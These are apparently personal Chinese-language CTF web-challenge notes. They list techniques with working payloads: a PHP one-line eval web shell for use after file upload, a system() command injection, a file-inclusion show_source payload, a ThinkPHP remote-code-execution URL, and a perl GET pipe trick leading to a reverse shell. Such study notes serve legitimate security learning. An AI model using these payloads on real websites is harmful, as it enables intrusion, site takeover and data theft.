## 一些解题思路

- 在url后面加入`index.php?`进行传参.【php弱类型比较？？`'abc'==0`??

- 使用*f12*查看元素

- 使用*hackbar*对服务器传递参数（发送*post*请求）

- 在*firefox*上设置代理，在*burp*上对数据包进行截取修改。（一般是网站有传参的时候才会使用*burp*对数据包进行拦截和修改）

- ***php shell***

  直接在`post`中传递shell命令获取flag：`shell=system('cat flag.txt')`;也可以通过`find`命令在`/`目录下查找`flag.txt`文件，然后使用`cat`命令获取`flag.txt`的文件内容。

- ***web shell***

  利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过中国菜刀chopper.exe即可获取和控制整个网站目录。

  `<?php @eval($_POST['attack']) ?>`

  @表示后面即使执行错误也不报错。`eval()`函数表示括号内的语句字符串什么的全都当做代码执行。

- 浏览器服务器接收到url的参数时会先自动对参数值进行**解码**。比如`%`会先编码为`%25`.

- **文件包含**

  `?page=http://127.0.0.1/index.php/?hello=<?show_source("fl2gisisish3r3.php");?>`

  利用**文件包含**将`page`后面的参数全部当做php来执行，此时该文件应该在本地服务器且为`index.php`。又因为存在`echo $_GET["hello"];`以`get`方法接收`hello`，又因为**文件包含**将`hello`后面的值当做代码执行，调用系统命令。

  


***XFF(X-Forwarded-For)***代表客户端，也就是HTTP的请求端真实的ip，只有在通过了HTTP代理或者负载均衡服务器时才会添加该项。

***HTTP Referer***是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的。



## ThinkPHP漏洞

ThinkPHP远程代码执行：

`/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&var[1]]=(系统命令)`



## Get命令 

- `GET`命令通过`perl`执行，`perl`在`open`当中可以执行命令，`open(FD,'ls|')`或者`open(FD,'|ls')`，前提是文件需要存在，所以使用`GET`命令的执行shell脚本命令时，需要先创建文件夹，例如使用`GET`执行`ls`命令，就需要先创建`'ls|'`（注意后面的`|`），`touch 'ls|'`,然后`GET ‘file:ls|'`，这个命令和直接在命令行执行`ls`获得的结果是一样的。

<img src="/Users/jackson/Documents/ctf/pengsj_notes/images/image-20201129150737662.png" alt="image-20201129150737662"  />

- 可以先在服务器上写上反弹shell命令
  1. 靶机请求页面写入文件当作脚本
  2. 创建bash命令文件
  3. `perl`漏洞执行反弹获取shell

- `GET`可以读取文件`GET ./filename`，读取根目录`GET /`

> 暂且不知道是什么：
>
> d2eeea69938b284db9fd454a4f1483f4
>
> 9872edb0e32d04659381b860b130a2b7
>
> 3b002f7b524b83f6c68cb45b0b217338

## URL编码与解码

给服务器传递url的时候，会对传递的参数进行url解码一次，有些网页源代码会将解码后的结果再解码一次，这就要求我们构造原字符两次编码之后的结果再进行传递。

















 













































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































